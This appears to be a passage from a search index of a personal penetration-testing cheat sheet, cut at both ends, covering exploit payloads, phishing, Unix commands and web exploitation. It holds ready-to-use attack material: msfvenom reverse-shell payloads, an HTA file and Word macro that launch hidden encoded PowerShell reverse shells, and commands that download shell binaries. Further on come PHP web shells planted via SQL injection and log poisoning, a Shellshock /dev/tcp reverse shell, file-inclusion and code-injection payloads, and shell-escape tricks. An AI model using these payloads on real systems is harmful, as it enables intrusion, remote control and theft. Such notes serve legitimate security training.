xfb\\xfc\\xfd\\xfe\\xff\"\n</code></pre>"},{"location":"red-teaming/exploit-dev/buffer-overflow/#exploit-payload","title":"Exploit Payload","text":"<pre><code>msfvenom -p windows/shell_reverse_tcp lhost=&lt;ip&gt; lport=443 EXITFUNC=thread -f c -b \"\\x00\" -e x86/shikata_ga_nai\n</code></pre> <pre><code>msfvenom -p linux/x86/shell_reverse_tcp lhost=&lt;ip&gt; lport=443 EXITFUNC=thread -f c -b \"\\x00\" -e x86/shikata_ga_nai\n</code></pre>"},{"location":"red-teaming/exploit-dev/buffer-overflow/#more-practice","title":"More practice","text":"<p>https://blog.hackerenv.com/buffer-overflow-tutorial-step-by-step-with-immunity-debugger-3</p> <p>https://github.com/V1n1v131r4/OSCP-Buffer-Overflow</p>"},{"location":"red-teaming/infor-gathering/infor-gathering/","title":"Information Gathering","text":""},{"location":"red-teaming/infor-gathering/infor-gathering/#osint-framework","title":"OSINT Framework","text":""},{"location":"red-teaming/infor-gathering/infor-gathering/#maltego","title":"Maltego","text":""},{"location":"red-teaming/infor-gathering/infor-gathering/#shodan","title":"Shodan","text":"<p>Searching Shodan For Fun And Profit</p> <ul> <li><code>city</code>: find devices in a particular city</li> <li><code>country</code>: find devices in a particular country</li> <li><code>geo</code>: you can pass it coordinates</li> <li><code>hostname</code>: find values that match the hostname</li> <li><code>net</code>: search based on an IP or /x CIDR</li> <li><code>os</code>: search based on operating system</li> <li><code>port</code>: find particular ports that are open</li> <li><code>before/after</code>: find results within a timeframe</li> </ul>"},{"location":"red-teaming/infor-gathering/infor-gathering/#security-header","title":"Security Header","text":"<pre><code>https://securityheaders.com/?q=leecybersec.com&amp;followRedirects=on\n</code></pre>"},{"location":"red-teaming/infor-gathering/infor-gathering/#ssl-labs","title":"SSL Labs","text":"<pre><code>https://www.ssllabs.com/ssltest/analyze.html?d=leecybersec.com&amp;latest\n</code></pre>"},{"location":"red-teaming/infor-gathering/infor-gathering/#social-searcher","title":"Social Searcher","text":"<pre><code>https://www.social-searcher.com/social-buzz/?q5=leecybersec.com\n</code></pre>"},{"location":"red-teaming/infor-gathering/infor-gathering/#google-hacking","title":"Google Hacking","text":"<pre><code>site:leecybersec.com filetype:html\n</code></pre> <pre><code>site:leecybersec.com -filetype:html\n</code></pre> <pre><code>intitle:\"index of\" \"backup\"\n</code></pre> <p>Google Hacking Database</p>"},{"location":"red-teaming/infor-gathering/infor-gathering/#source-code-public","title":"Source Code Public","text":"<p>About searching on GitHub</p> <pre><code>in:file web user:leecybersec\n</code></pre> <pre><code>gitleaks -v -r=https://github.com/leecybersec/client-splunk\n</code></pre>"},{"location":"red-teaming/infor-gathering/infor-gathering/#netcraft","title":"Netcraft","text":"<p>Netcraft\u2019s DNS search: https://searchdns.netcraft.com</p> <pre><code>https://searchdns.netcraft.com/?restriction=site+contains&amp;host=.leecybersec.com&amp;position=limited\n</code></pre> <p>\"site report\": https://sitereport.netcraft.com</p> <pre><code>https://sitereport.netcraft.com/?url=https%3A%2F%2Fleecybersec.com\n</code></pre>"},{"location":"red-teaming/infor-gathering/infor-gathering/#recon-ng","title":"Recon-ng","text":"<pre><code>marketplace search site\n</code></pre> <pre><code>marketplace info recon/domains-hosts/bing_domain_web\n</code></pre> <pre><code>marketplace install recon/domains-hosts/bing_domain_web\n</code></pre> <pre><code>modules load recon/domains-hosts/bing_domain_web\n</code></pre> <pre><code>options set source leecybersec.com\n</code></pre>"},{"location":"red-teaming/infor-gathering/infor-gathering/#theharvester","title":"Theharvester","text":"<pre><code>theHarvester -d leecybersec.com -b google\n</code></pre>"},{"location":"red-teaming/infor-gathering/infor-gathering/#linkedin2username","title":"linkedin2username","text":"<pre><code>python3 linkedin2username.py -u 'linkedin-username' -n &lt;domain&gt; -c &lt;company-name&gt;\n</code></pre>"},{"location":"red-teaming/malware-development/","title":"Malware development","text":"<p>https://0xpat.github.io/Malware_development_part_1</p> <p>https://www.abatchy.com/2017/05/rot-n-shellcode-encoder-linux-x86</p>"},{"location":"red-teaming/social-engineering/","title":"Phishing Some Fish","text":""},{"location":"red-teaming/social-engineering/#client-fingerprinting","title":"Client Fingerprinting","text":"<p>FingerprintJS</p>"},{"location":"red-teaming/social-engineering/#html-applications","title":"HTML Applications","text":"<p>File: index.hta</p> <pre><code>&lt;html&gt;\n&lt;body&gt;\n    &lt;script&gt;\n\n    var c= 'cmd.exe'\n\n    new ActiveXObject('WScript.Shell').Run(c);\n\n    &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>File: evil.hta</p> <pre><code>sudo msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f hta-psh -o /var/www/html/evil.hta\n</code></pre>"},{"location":"red-teaming/social-engineering/#microsoft-office","title":"Microsoft Office","text":""},{"location":"red-teaming/social-engineering/#microsoft-word-macro","title":"Microsoft Word Macro","text":"<pre><code>str = \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad...\"\n\nn = 50\n\nfor i in range(0, len(str), n):\n    print \"Str = Str + \" + '\"' + str[i:i+n] + '\"'\n</code></pre> <pre><code>Sub AutoOpen()\n    ReverseShell\nEnd Sub\n\nSub Document_Open()\n    ReverseShell\nEnd Sub\n\nSub ReverseShell()\n    Dim Str As String\n\n    Str = Str + \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad\"\n    Str = Str + \"ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA\"\n    ...\n    Str = Str + \"yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA\"\n    Str = Str + \"G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM\"\n    Str = Str + \"AdABhAHIAdAAoACQAcwApADsA\"\n\n    CreateObject(\"Wscript.Shell\").Run Str\nEnd Sub\n</code></pre>"},{"location":"red-teaming/social-engineering/#object-linking-and-embedding","title":"Object Linking and Embedding","text":"<p>ReverseShell.bat</p> <pre><code>START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad...\n</code></pre>"},{"location":"red-teaming/social-engineering/#web-phishing","title":"Web Phishing","text":""},{"location":"red-teaming/unix-system/commands/","title":"Unix Command Line","text":""},{"location":"red-teaming/unix-system/commands/#manual-page-guide","title":"Manual page guide","text":"<pre><code>man &lt;key search&gt;\n</code></pre> <pre><code>man -k '^passwd$'\n</code></pre> <p>In Manual page, execute <code>!/bin/bash</code> to spawn a shell.</p>"},{"location":"red-teaming/unix-system/commands/#file-permissions","title":"File Permissions","text":""},{"location":"red-teaming/unix-system/commands/#unix-filesystem","title":"Unix Filesystem","text":"<p>Wiki Unix filesystem</p> <ul> <li>/bin - basic programs (ls, cd, cat, etc.)</li> <li>/sbin - system programs (fdisk, mkfs, sysctl, etc)</li> <li>/etc - configuration files</li> <li>/tmp - temporary files (typically deleted on boot)</li> <li>/usr/bin - applications (apt, ncat, nmap, etc.)</li> <li>/usr/share - application support and data files</li> </ul> <p>View the file's permssion</p> statls <pre><code>stat myfile\n</code></pre> <pre><code>ls -l myfile\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#play-with-text-and-files","title":"Play with text and files","text":""},{"location":"red-teaming/unix-system/commands/#terminal-editor","title":"Terminal editor","text":"vinano <pre><code>vi -c ':!/bin/sh' /dev/null\n</code></pre> <pre><code>vi\n:set shell=/bin/sh\n:shell\n</code></pre> <pre><code>nano\n^R^X\nreset; sh 1&gt;&amp;0 2&gt;&amp;0\n</code></pre> <pre><code>sudo nano /var/opt/../../etc/sudoers\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#finding","title":"Finding","text":"finding fileshistory, bashrc, backupBinaries That AutoElevateSpawn shell <pre><code>find / -name \"&lt;name&gt;\"\n</code></pre> <pre><code>find / -name *history* 2&gt;/dev/null\nfind / -name *bashrc* -exec grep passwod {} \\; 2&gt;/dev/null\n</code></pre> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <pre><code>find . -exec /bin/sh \\;\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#downloading","title":"Downloading","text":"wgetcurlaxel <pre><code>wget -O /tmp/shell http://192.168.110.131/shell.elf\n\nwget &lt;uri&gt; -P /path/to/\n</code></pre> <pre><code>curl -o /tmp/shell http://192.168.110.131/shell.elf\n</code></pre> <pre><code>axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#output-filtering","title":"Output Filtering","text":"sedcutawkuniq -cgrep <pre><code>sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //'\n</code></pre> <pre><code>echo \"hacking, penetration testing and bug hunting\"| cut -f 2 -d \" \"\n</code></pre> <pre><code>cut -d \":\" -f 1 /etc/passwd\n</code></pre> <pre><code>cat /etc/passwd | awk -F \":\" '{print $1, \":\", $7}' | grep \"sh\"\n</code></pre> <pre><code>cat list.txt | sort | uniq -c | sort -r\n</code></pre> <pre><code>ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d' '\n</code></pre> <pre><code>grep -v \"Nmap\"\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#redirect","title":"Redirect","text":"save file using catto a New Fileto an Existing Filefrom a FileSTDERR <pre><code>cat &gt; filename &lt;&lt;EOL\n\nSome text content\nSome text content 2\nSome text content 3\n\nEOL\n</code></pre> <pre><code>ls &gt; list.txt\n</code></pre> <pre><code>cat list.txt\nDesktop\nDocuments\nlist.txt\n</code></pre> <pre><code>echo \"Add new\" &gt;&gt; list.txt\n</code></pre> <pre><code>wc -m &lt; list.txt\n</code></pre> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#processes","title":"Processes","text":""},{"location":"red-teaming/unix-system/commands/#running-services-and-kill","title":"Running services and kill","text":"<pre><code>ps -ef\n</code></pre> <pre><code>ps aux\n</code></pre> <pre><code>ps -fC &lt;process-name&gt;\n</code></pre> <pre><code>kill &lt;id&gt;\n</code></pre> <p>Checking running services</p> <pre><code>sudo ss -antlp\n</code></pre> <p>Checking all available services</p> <pre><code>systemctl list-unit-files\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#monitoring","title":"Monitoring","text":"tailwatch <pre><code>sudo tail -f /var/log/apache2/access.log\n</code></pre> <pre><code>watch -n 1 &lt;command&gt;\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#ssh-service","title":"SSH Service","text":"<pre><code>sudo systemctl start ssh\n</code></pre> <p>Start SSH service automatically at boot time.</p> <pre><code>sudo systemctl enable ssh\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#web-service","title":"Web Service","text":"<p>Apache2</p> <pre><code>sudo systemctl start apache2\n</code></pre> <p>Python</p> <pre><code>python3 -m http.server 80\n</code></pre> <pre><code>python -m SimpleHTTPServer 80\n</code></pre> <p>php</p> <pre><code>php -S 0.0.0.0:80\n</code></pre> <p>busybox</p> <pre><code>busybox httpd -f -p 80\n</code></pre> <p>Start HTTP service automatically at boot time.</p> <pre><code>sudo systemctl enable apache2\n</code></pre>"},{"location":"red-teaming/unix-system/commands/#screenshot","title":"Screenshot","text":"<pre><code>cutycapt --url=$ip --out=$ip.png\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/","title":"Terminal","text":""},{"location":"red-teaming/unix-system/terminal/#bash-environment","title":"Bash Environment","text":"<pre><code>echo $PATH\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#set-an-environment-variable","title":"Set an environment variable","text":"<pre><code>export ip=&lt;ip&gt;\n</code></pre> <pre><code>ping $ip\nnmap $ip\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#all-environment-variables","title":"All environment variables","text":"<pre><code>env\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#custom-terminal","title":"Custom terminal","text":"<pre><code>alias cpu=\"grep 'cpu ' /proc/stat | awk '{usage=(\\$2+\\$4)*100/(\\$2+\\$4+\\$5)} END {print usage}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\"\nalias ram=\"free | grep Mem | awk '{print \\$3/\\$2 * 100.0}' | awk '{printf(\\\"%.1f\\n\\\", \\$1)}'\"\nalias myip='ip add | grep \"inet \" | grep -v \"127.0.0.1\" | cut -d\"/\" -f1 | cut -d \" \" -f 6 | tail -1'\n</code></pre> <pre><code>PROMPT=$'%F{%(#.blue.green)}\u250c\u2500\u2500${debian_chroot:+($debian_chroot)\u2500\u2500}(%B%F{%(#.red.blue)}Hades%(#.\ud83d\udc80.\u327f)%b$(myip)%F{%(#.blue.green)})-[$(cpu):$(ram)]%B%F{reset}%(6~.%-1~/\u2026/%4~.%5~)%b%F{%(#.blue.green)}\\n\u2514\u2500%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#background-commands","title":"Background commands","text":"Background a processSuspend and bgjobs and fg <pre><code>nmap -p- 127.0.0.1 &amp;\n</code></pre> <pre><code>nmap -p- $ip -Pn\n^Z\nbg\n</code></pre> <pre><code>\u250c\u2500\u2500(Hades\u327f192.168.11.130)-[0.7:11.1]~\n\u2514\u2500$ jobs\n\n[1]  + running    nmap -p- 192.168.11.131 -Pn\n\n\u250c\u2500\u2500(Hades\u327f192.168.11.130)-[0.8:11.4]~\n\u2514\u2500$ fg\n\n[1]  + running    nmap -p- 192.168.11.131 -Pn\n^C\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#history","title":"History","text":""},{"location":"red-teaming/unix-system/terminal/#re-run-the-first-command","title":"Re-run the first command","text":"<pre><code>!1\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#repeats-the-last-command","title":"Repeats the last command","text":"<pre><code>!!\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#exit-code","title":"Exit code","text":"<p>Exit code 0 denotes a program\u2019s successful execution.</p> <p>Non-zero exit code denotes an unsuccessful execution of a program</p> <pre><code>echo $?\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#bash-scripting","title":"Bash Scripting","text":"<p>https://devhints.io/bash</p> <p>https://github.com/leecybersec/scripting</p>"},{"location":"red-teaming/unix-system/terminal/#hello-world","title":"Hello World","text":"Runninghello_world.sh <pre><code>chmod +x hello_world.sh\n\n./hello_world.sh\n</code></pre> <pre><code>#!/bin/bash\n\necho \"Hello World!\"\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#my-self-script","title":"My Self Script","text":"Runningmy_self.sh <pre><code>chmod +x my_self.sh\n\n./my_self.sh\n</code></pre> <pre><code>#!/bin/bash\n\nip=\"$(ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d' ')\"\n\nname=`whoami`\n\necho \"I'm $name\"\n\necho \"My IP is $ip\"\n\necho \"Command: ping -c 2 $ip\"\n\nping -c 2 $ip\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#arguments-and-if-else","title":"Arguments and If Else","text":"ArgumentsIf Else Elif <ul> <li><code>$0</code> The name of the Bash script</li> <li><code>$1 -$9</code> The first 9 arguments to the Bash script</li> <li><code>$#</code> Number of arguments passed to the Bash script</li> <li><code>$@</code> All arguments passed to the Bash script</li> <li><code>$?</code> The exit status of the most recently run process</li> <li><code>$$</code> The process ID of the current script</li> <li><code>$USER</code> The username of the user running the script</li> <li><code>$HOSTNAME</code> The hostname of the machine</li> <li><code>$RANDOM</code> A random number</li> <li><code>$LINENO</code> The current line number in the script</li> </ul> <ul> <li><code>!EXPRESSION</code> The EXPRESSION is false.</li> <li><code>-n STRING</code> STRING length is greater than zero</li> <li><code>-z STRING</code> The length of STRING is zero (empty)</li> <li><code>STRING1 != STRING2</code> STRING1 is not equal to STRING2</li> <li><code>STRING1 = STRING2</code> STRING1 is equal to STRING2</li> <li><code>INTEGER1 -eq INTEGER2</code> INTEGER1 is equal to INTEGER2</li> <li><code>INTEGER1 -ne INTEGER2</code> INTEGER1 is not equal to INTEGER2</li> <li><code>INTEGER1 -gt INTEGER2</code> INTEGER1 is greater than INTEGER2</li> <li><code>INTEGER1 -lt INTEGER2</code> INTEGER1 is less than INTEGER2</li> <li><code>INTEGER1 -ge INTEGER2</code> INTEGER1 is greater than or equal to INTEGER 2</li> <li><code>INTEGER1 -le INTEGER2</code> INTEGER1 is less than or equal to INTEGER 2</li> <li><code>-d FILE</code> FILE exists and is a directory</li> <li><code>-e FILE</code> FILE exists</li> <li><code>-r FILE</code> FILE exists and has read permission</li> <li><code>-s FILE</code> FILE exists and it is not empty</li> <li><code>-w FILE</code> FILE exists and has write permission</li> <li><code>-x FILE</code> FILE exists and has execute permission</li> </ul> <p>Nmap All Ports Scan Script</p> Runningnmap_all_ports.sh <pre><code>chmod +x nmap_all_ports.sh\n\n./nmap_all_ports.sh 127.0.0.1\n</code></pre> <pre><code>#!/bin/bash\n\nif [ $# -eq 0 ] || [ $1 = \"-h\" ] || [ $1 = \"--help\" ]\nthen\n    echo \"Usage: $0 &lt;HOST&gt;\"\n    exit\nelse\n    ports=$(nmap -p- --min-rate 1000 $1 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$//)\n\n    if [ -z $ports ]\n    then\n        echo \"No open port!\"\n        exit\n    else\n        echo \"Opening port: $ports\"\n        nmap -sC -sV -p $ports $1\n    fi\nfi\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#loops-and-functions","title":"Loops and Functions","text":"LoopsFunctions <pre><code>for var-name in &lt;list&gt;\ndo\n    &lt;action to perform&gt;\ndone\n</code></pre> <pre><code>while [ &lt;some test&gt; ]\ndo\n    &lt;perform an action&gt;\ndone\n</code></pre> <pre><code>function function_name \n{\n    commands...\n}\n</code></pre> <pre><code>function_name ()\n{\n    commands...\n}\n</code></pre>"},{"location":"red-teaming/unix-system/terminal/#auto-enum-script","title":"Auto Enum Script","text":"Runningauto_enum.sh <pre><code>chmod +x auto_enum.sh\n\n./auto_enum.sh 127.0.0.1\n</code></pre> <pre><code>#!/bin/bash\n\nRED='\\033[0;31m'\nYELLOW='\\033[0;33m'\nGREEN='\\033[0;32m'\nNC='\\033[0m'\norigIFS=\"${IFS}\"\n\nif [ -z $1 ]; then\n    echo \"Usage: $0 &lt;HOST&gt;\"\n    exit\nelse\n    host=$1\n    ports=$2\n    service=$3\nfi\n\nenum_all_port ()\n{\n    printf \"\\n${YELLOW}Scanning openning port ...\\n${NC}\"\n    if [ -z $ports ]; then\n        ports=$(nmap -sS -p- --min-rate 1000 $host | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$//)\n    fi\n\n    if [ -z $ports ]; then\n        printf \"${RED}[-] Found no openning port!${NC}\"\n        exit\n    else\n        printf \"${GREEN}[+] Openning ports: $ports\\n${NC}\"\n        array_ports=$(echo $ports | tr ',' '\\n')\n    fi\n}\n\nenum_open_service ()\n{\n    printf \"\\n${YELLOW}===============================services===============================\\n${NC}\"\n\n    echo \"nmap -sC -sV -Pn $1 -p$2\"\n    nmap -sC -sV $host -p$ports\n}\n\nenum_smtp_service ()\n{\n    printf \"\\n${YELLOW}===============================$port===============================\\n${NC}\"\n\n    echo \"nmap $host -p$port -Pn --script=smtp-*\"\n    nmap $host -p$port --script=smtp-*\n}\n\nenum_web_service ()\n{\n    printf \"\\n${YELLOW}===============================$url===============================\\n${NC}\"\n\n    printf \"\\n${GREEN}[+] Files and directories\\n${NC}\"\n    echo \"gobuster dir -k -u $url:$port -w /usr/share/seclists/Discovery/Web-Content/common.txt\"\n    gobuster dir -k -u $url:$port -w /usr/share/seclists/Discovery/Web-Content/common.txt\n\n    printf \"\\n${GREEN}[+] All URLs\\n${NC}\"\n    curl -k $url:$port -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//'\n}\n\nenum_smb_service ()\n{\n    printf \"\\n${YELLOW}===============================$port===============================\\n${NC}\"\n\n    echo \"smbmap -H $host\"\n    smbmap -H $host\n\n    echo \"smbclient -L $host\"\n    smbclient -NL $host\n}\n\nrecon ()\n{\n    if [ -z $service ]; then\n\n        for port in $array_ports; do\n            if [ $port = \"25\" ]; then\n\n                enum_smtp_service $host $port\n\n            elif [ $port = \"80\" ]; then\n\n                url=\"http://$host\"\n                enum_web_service $url $port\n\n            elif [ $port = \"443\" ]; then\n\n                url=\"https://$host\"\n                enum_web_service $url $port\n\n            elif [ $port = \"445\" ]; then\n\n                enum_smb_service $host $port\n\n            fi\n        done\n\n    else\n\n        port=$ports     \n\n        if [ $service = \"smtp\" ]; then\n\n            enum_smtp_service $host $port\n\n        elif [ $service = \"http\" ]; then\n\n            url=\"http://$host\"\n            enum_web_service $url $port\n\n        elif [ $service = \"https\" ]; then\n\n            url=\"https://$host\"\n            enum_web_service $url $port\n\n        elif [ $service = \"smb\" ]; then\n\n            enum_smb_service $host $port\n\n        fi\n\n    fi\n}\n\nmain ()\n{\n    enum_all_port $host $ports\n\n    enum_open_service $host $ports\n\n    recon $array_ports $service\n}\n\nmain\n</code></pre>"},{"location":"web-application/","title":"Table of contents","text":""},{"location":"web-application/enumeration/","title":"Enumeration","text":""},{"location":"web-application/enumeration/#enum-follow","title":"Enum follow","text":"<ul> <li>Inspecting URLs</li> <li>Inspecting Page Content</li> <li>Viewing Response Headers</li> <li>Inspecting Sitemaps <code>robots.txt</code>, <code>sitemap.xml</code></li> <li>Locating Administration Consoles</li> </ul> <pre><code>curl http://$ip\n</code></pre> <pre><code>curl http://$ip -s -L | grep \"title\\|href\" | sed -e 's/^[[:space:]]*//'\n</code></pre>"},{"location":"web-application/enumeration/#recon-web","title":"Recon web","text":"<ol> <li>Check cookies</li> <li>Check the redirection</li> <li>Check SQLi <code>admin' or '1'='1</code></li> <li>Check credentials <code>admin</code> and <code>Admin</code>, <code>admin</code> and <code>admin</code></li> </ol> <p>Authentication</p> <ol> <li>Check IDOR</li> <li>Check .js, .json</li> <li>Check Object-relational mapping (&amp;admin[admin]=1)</li> </ol>"},{"location":"web-application/enumeration/#virtual-hosting","title":"Virtual hosting","text":"<p>Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers).</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$host -H 'Host: FUZZ.$domain' -fw number\n</code></pre> <pre><code>gobuster vhost -u pit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n</code></pre> <p>Reference: https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing</p>"},{"location":"web-application/enumeration/#web-discovery","title":"Web Discovery","text":"<p>ffuf</p> <pre><code>ffuf -s -w /usr/share/seclists/Discovery/Web-Content/common.txt -u \"$url:$port/FUZZ\" -e $ext -fw number\n</code></pre> <p>gobuster</p> <pre><code>gobuster dir -u http://$ip/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/ -x txt,sh,php,cgi -s '200,204,403,500'\n</code></pre> <p>dirb</p> <pre><code>dirb http://$ip:$port/ /usr/share/wordlists/dirb/common.txt -r\n</code></pre>"},{"location":"web-application/enumeration/#nikto","title":"Nikto","text":"<pre><code>nikto -h $ip\n</code></pre>"},{"location":"web-application/exploitation/","title":"Exploitation","text":""},{"location":"web-application/exploitation/#credentials","title":"Credentials","text":"<p>Create Passwd Directory for Brute Force</p> <pre><code>cewl -m 5 http://$ip/joomla/ &gt; passwd.txt\n</code></pre> <p>Default Credentials</p> <pre><code>ls /usr/share/seclists/Passwords/Default-Credentials\n</code></pre> <p>Crack hash</p> <pre><code>john hash --wordlist=/home/kali/tools/directory/rockyou.txt\n</code></pre> <p>Broute force</p> <pre><code>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.169.106 --http-post-form '/login:user=^USER^,pass=^PASS^:Unauthorized'\n</code></pre>"},{"location":"web-application/exploitation/#directory-traversal","title":"Directory Traversal","text":"<p>Unix</p> <pre><code>/etc/passwd\n</code></pre> <p>Windows</p> <pre><code>c:\\windows\\system32\\drivers\\etc\\hosts\n</code></pre>"},{"location":"web-application/exploitation/#php-wrappers","title":"PHP Wrappers","text":"<p>Inject php code via plantext </p> <pre><code>http://ip/file.php?file=data:text/plain,&lt;?php echo shell_exec(\"dir\") ?&gt;\n</code></pre> <p>Inject php code via base64</p> <pre><code>http://ip/file.php?file=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=dir\n</code></pre> <p>Encode base64 file before read it.</p> <pre><code>http://ip/file.php?file=php://filter/read=convert.base64-encode/resource=/etc/passwd\n</code></pre>"},{"location":"web-application/exploitation/#file-inclusion","title":"File Inclusion","text":""},{"location":"web-application/exploitation/#local-file-inclusion","title":"Local File Inclusion","text":"<p>Null byte: <code>%00</code></p> <p>Write payload to <code>access.log</code> file</p> <pre><code>$ nc -nv 192.168.11.131 80\n(UNKNOWN) [192.168.11.131] 80 (http) open\n&lt;?php echo '&lt;pre&gt;' . shell_exec($_GET['cmd']) . '&lt;/pre&gt;';?&gt;\n</code></pre> <p>Get RCE via file inclusion</p> <pre><code>curl http://192.168.11.131/file.php?file=c:\\xampp\\apache\\logs\\access.log&amp;cmd=ipconfig\n</code></pre>"},{"location":"web-application/exploitation/#remote-file-inclusion","title":"Remote File Inclusion","text":"<pre><code>&lt;?php echo shell_exec($_GET['cmd']); ?&gt;\n</code></pre> <pre><code>curl http://target/?page=http://$ip/backdoor.txt&amp;cmd=id\n</code></pre>"},{"location":"web-application/exploitation/#sql-injection","title":"SQL Injection","text":""},{"location":"web-application/exploitation/#authentication-bypass","title":"Authentication Bypass","text":"<pre><code>admin' or 1=1 LIMIT 1;#\n</code></pre>"},{"location":"web-application/exploitation/#enumerating-the-database","title":"Enumerating the Database","text":"<pre><code>order by 3\n</code></pre> <pre><code>union all select 1, 2, 3\n</code></pre> <pre><code>union all select 1, @@version, 3\n</code></pre> <pre><code>union all select 1, table_name from information_schema.tables, 3\n</code></pre> <pre><code>union all select 1, column_name from information_schema.columns where table_name='users', 3\n</code></pre> <pre><code>union all select 1, username, password from users\n</code></pre>"},{"location":"web-application/exploitation/#sqli-to-code-execution","title":"SQLi to Code Execution","text":"<p>Read file</p> <pre><code>union all select 1, load_file('C:/Windows/System32/drivers/etc/hosts'), 3\n</code></pre> <p>Write backdoor</p> <pre><code>union all select 1, \"&lt;?php echo shell_exec($_GET['cmd']);?&gt;\" into OUTFILE 'c:/xampp/htdocs/backdoor.php', 3\n</code></pre> <pre><code>priority=Normal' UNION SELECT ('&lt;?php echo exec($_GET[\"c\"]);') INTO OUTFILE '/srv/http/c.php'; -- -\n</code></pre>"},{"location":"web-application/exploitation/#automating-sql-injection","title":"Automating SQL Injection","text":"<p>sqlmap</p> <ol> <li>B: Boolean-based blind</li> <li>E: Error-based</li> <li>U: Union query-based</li> <li>S: Stacked queries</li> <li>T: Time-based blind</li> <li>Q: Inline queries</li> </ol> <pre><code>sqlmap -u http://$ip/debug.php?id=1 -p \"id\"\n</code></pre> <p>dump databases</p> <pre><code>sqlmap -u http://$ip/debug.php?id=1 -p \"id\" --dbms=mysql --dump\n</code></pre> <p>execute a shell</p> <pre><code>sqlmap -u http://$ip/debug.php?id=1 -p \"id\" --dbms=mysql --os-shell\n</code></pre> <p>file post</p> <pre><code>sqlmap -r req --dbms mysql -p limit --level 3 --batch --technique=S --os-shell\n</code></pre>"},{"location":"web-application/exploitation/#shellshock-poc","title":"Shellshock POC","text":"<pre><code>curl -H \"user-agent: () { :; }; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/$myip/445 0&gt;&amp;1'\" http://$ip/cgi-bin/user.sh\n</code></pre>"},{"location":"web-application/exploitation/#command-execution","title":"Command Execution","text":"<pre><code>;id\n`id`\n$(id)\n</code></pre>"},{"location":"web-application/exploitation/#code-execution","title":"Code Execution","text":"<p>Ruby </p> <pre><code>eval \"\\\"\"+params['1']+\"\\\"\"\n\n?1=\"%2b`id`%2b\"\n</code></pre> <p>Python</p> <pre><code>eval('\"'+1+'\"')\n\n\"%2bos.system('id')%2b\"\n\n\"%2bos.popen('id').read()%2b\"\n\n\"%2b__import__('os').popen('id').read()%2b\"\n\n\"%2b__import__('os').popen(__import__('base64').b64decode('aWQ=')).read()%2b\"\n</code></pre> <p>Perl</p> <pre><code>eval(\"return '\".$FORM{1}.\"'\");\n\n/cgi-bin/form?1='.`id`.'\n</code></pre> <p>PHP</p> <p>eval()</p> <pre><code>$s=\"echo \\\"\".$_GET['1'].\"\\\";\";\n\neval($s);\n\n?1=\".system('id').\"\n</code></pre> <p>usort()</p> <pre><code>$1 = $_GET[\"1\"];\n\nusort(function('$a, $b', 'return strcmp($a-&gt;'.$1.',$b-&gt;'.$1.');'));\n\n?1=id);}system('id');//\n</code></pre> <p>preg_replace()</p> <pre><code>preg_replace($_GET[\"1\"], $_GET[\"2\"], $_GET[\"3\"]);\n\n?1=/x/e&amp;2=system('id')&amp;3=x\n</code></pre> <p>assert()</p> <pre><code>assert(trim(\"'\".$_GET['1'].\"'\"));\n\necho htmlentities($_GET['1']);\n\n?1=hacker'.system('id').'\n</code></pre>"},{"location":"web-application/exploitation/#sitemaster-to-rce","title":"site.master to RCE","text":"<pre><code>&lt;%@ Language=\"C#\" src=\"site.master.cs\" Inherits=\"MyNamespaceMaster.MyClassMaster\" %&gt;\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\"&gt;\n    &lt;head runat=\"server\"&gt;\n        &lt;title&gt;Butch&lt;/title&gt;\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; 